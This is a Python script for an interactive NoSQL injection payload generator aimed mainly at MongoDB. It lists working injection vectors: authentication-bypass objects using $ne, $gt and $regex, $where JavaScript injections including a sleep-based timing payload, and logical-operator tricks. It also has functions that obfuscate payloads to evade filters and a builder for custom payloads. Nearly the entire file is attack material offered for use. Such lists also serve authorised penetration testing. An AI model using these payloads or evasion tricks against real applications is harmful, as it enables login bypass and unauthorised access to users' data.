import random
import string
import json

# Common NoSQL injection vectors (primarily MongoDB-focused)
NOSQL_VECTORS = [
    # Basic Comparison Operators
    "{'$gt': ''}",
    "{'$ne': null}",
    "{'$eq': true}",
    "{'$lt': 999999999}",
    
    # Authentication Bypass
    "{'username': {'$ne': null}, 'password': {'$ne': null}}",
    "{'username': 'admin', 'password': {'$gt': ''}}",
    "{'email': {'$regex': '.*'}, 'password': {'$ne': ''}}",
    "{'$or': [{'username': 'admin'}, {'username': {'$ne': null}}]}",
    
    # Logical Operators
    "{'$or': [{'active': true}, {'active': false}]}",
    "{'$and': [{'id': {'$ne': null}}, {'id': {'$exists': true}}]}",
    "{'$nor': [{'deleted': true}, {'hidden': true}]}",
    
    # JavaScript Injection (MongoDB $where)
    "{'$where': 'this.username == \"admin\"'}",
    "{'$where': '1 == 1'}",
    "{'$where': 'sleep(5000)'}",
    "{'$where': 'function(){return true;}'}",
    
    # Query Operators
    "{'$exists': true}",
    "{'$in': ['admin', 'user']}",
    "{'$nin': ['guest', null]}",
    "{'$regex': '.*'}",
    
    # Array and Object Manipulation
    "{'roles': {'$elemMatch': {'$ne': null}}}",
    "{'data': {'$type': 'string'}}",
    "{'tags': {'$size': {'$gt': 0}}}",
    
    # Evasion Techniques
    "{'$gt': '' /* comment */}",
    "{'$ne': null // bypass'}",
    "{'$regex': /.*?/}",
    "{'$or': [{}, {'active': true}]}",
    
    # Advanced Payloads
    "{'$expr': {'$eq': ['$username', 'admin']}}",
    "{'$jsonSchema': {'type': 'object'}}",
    "{'$mod': [2, 0]}",  # Numeric modulo operator
    "{'$where': 'this.password.length > 0'}",
]

# Obfuscation techniques for NoSQL payloads
def obfuscate_payload(payload):
    """Simple obfuscation for NoSQL payloads."""
    methods = [
        lambda p: p.replace("'", "\"").replace(" ", "/* */"),  # Inline comments
        lambda p: p.replace("$", "%24").replace("'", "%27"),  # URL encoding
        lambda p: ''.join(c + random.choice(["", " "]) for c in p),  # Random spacing
        lambda p: p.replace("$where", "$wh/**/ere"),  # Split keywords
    ]
    return random.choice(methods)(payload)

def generate_random_string(length=8):
    """Generate a random string for payload customization."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class NoSQLInjectionGenerator:
    def __init__(self):
        self.custom_payloads = []

    def generate_random_payload(self, include_obfuscation=False):
        """Generate a random NoSQL injection payload from the vector list."""
        base_payload = random.choice(NOSQL_VECTORS)
        # Add a random string to make it unique (for values like 'admin')
        random_str = generate_random_string()
        payload = base_payload.replace("admin", f"admin_{random_str}")
        
        if include_obfuscation:
            payload = obfuscate_payload(payload)
        
        return payload

    def create_custom_payload(self, user_input, injection_type="basic"):
        """Create a custom NoSQL injection payload based on user input."""
        if injection_type == "basic":
            payload = f"{{'{user_input}': {{'$ne': null}}}}"
        elif injection_type == "regex":
            payload = f"{{'{user_input}': {{'$regex': '.*'}}}}"
        elif injection_type == "where":
            payload = f"{{'$where': '{user_input}'}}"
        elif injection_type == "or":
            payload = f"{{'$or': [{{'{user_input}': true}}, {{'{user_input}': {{'$ne': null}}}}]}}"
        else:
            payload = f"{{{user_input}}}"
        
        self.custom_payloads.append(payload)
        return payload

    def list_payloads(self):
        """List all generated custom payloads."""
        return self.custom_payloads if self.custom_payloads else ["No custom payloads generated yet."]

def main():
    generator = NoSQLInjectionGenerator()
    
    while True:
        print("\nNoSQL Injection Payload Generator")
        print("1. Generate Random Payload")
        print("2. Generate Random Obfuscated Payload")
        print("3. Create Custom Payload")
        print("4. List Custom Payloads")
        print("5. Exit")
        
        choice = input("Choose an option (1-5): ")
        
        if choice == "1":
            payload = generator.generate_random_payload()
            print(f"Random Payload: {payload}")
        
        elif choice == "2":
            payload = generator.generate_random_payload(include_obfuscation=True)
            print(f"Random Obfuscated Payload: {payload}")
        
        elif choice == "3":
            user_input = input("Enter your custom field or condition (e.g., username, this.active == true): ")
            inj_type = input("Enter injection type (basic, regex, where, or) [default: basic]: ") or "basic"
            payload = generator.create_custom_payload(user_input, inj_type)
            print(f"Custom Payload: {payload}")
        
        elif choice == "4":
            payloads = generator.list_payloads()
            print("Custom Payloads:")
            for i, p in enumerate(payloads, 1):
                print(f"{i}. {p}")
        
        elif choice == "5":
            print("Exiting...")
            break
        
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
